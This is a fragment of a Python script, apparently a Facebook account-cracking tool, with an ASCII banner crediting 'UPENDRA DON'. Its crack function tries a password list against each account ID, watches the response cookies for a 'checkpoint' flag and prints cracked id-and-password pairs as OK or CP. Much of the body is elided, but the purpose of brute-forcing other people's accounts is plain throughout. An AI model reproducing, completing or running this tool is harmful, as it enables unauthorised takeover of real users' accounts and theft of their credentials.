...
█░█ █▀█ █▀▀ █▄░█ █▀▄ █▀█ ▄▀█
█▄█ █▀▀ ██▄ █░▀█ █▄▀ █▀▄ █▀█
\033[1;32m------------ 𝚆𝙸𝙵𝙸 𝚄𝚂𝙴 𝙷𝙰𝙽 𝙼𝚄𝙹𝙸 -------------
\033[1;32m【💥】𝘾𝙍𝙀𝘼𝙏𝙀𝘿 𝘽𝙔   ✯  UPENDRA
\033[1;32m【💥】 𝙁𝘽 𝙉𝘼𝙈𝙀   ✯  UPENDRA DON
\033[1;32m【💥】𝙊𝙉 𝙂𝙄𝙏𝙃𝙐𝘽   ✯   ERROR
\033[1;32m【💥】𝙏𝙊𝙊𝙇 𝙎𝙏𝘼𝙏𝙐𝙎 ✯  \033[1;32m𝕱𝖗𝖊𝖊 
\033[1;32m【💥】𝙏𝙊𝙊𝙇 𝙑𝙀𝙍𝙎𝙄𝙊𝙉 ✯  1.0 
\033[1;36m-𝕱𝖊𝖊𝖑 𝖙𝖍𝖊 𝖕𝖔𝖜𝖊𝖗 𝖔𝖋 upendra-""")
def banner():
	print(logo)
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r {P}[UPENDRA DON]{P} {P}{loop}{P}/{P}{len(id)}{P} OK{P}[{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	...
	for pw in pwv:
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				print(f'\r{P}{K} [UPENDRA-CP] {idf} │ {pw} {P}')
				...
				print(f'\r{P}{H} [UPENDRA-OK] {idf} │ {pw} {P}')
